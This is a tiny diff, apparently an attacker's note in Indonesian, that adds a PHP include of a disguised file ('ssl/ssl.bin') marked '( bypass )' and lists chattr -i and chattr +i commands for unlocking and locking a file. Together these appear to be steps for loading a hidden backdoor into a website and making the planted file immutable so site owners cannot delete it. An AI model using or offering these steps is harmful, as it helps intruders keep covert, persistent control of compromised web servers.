@@ -1,3 +1,5 @@
+<?php include ("/home/bimaunkhair/ssl/ssl.bin"); ?> ( bypass )
+
 chattr -i file.php (buat hijaukan)
 chattr +i file.php (buat putihkan)
 
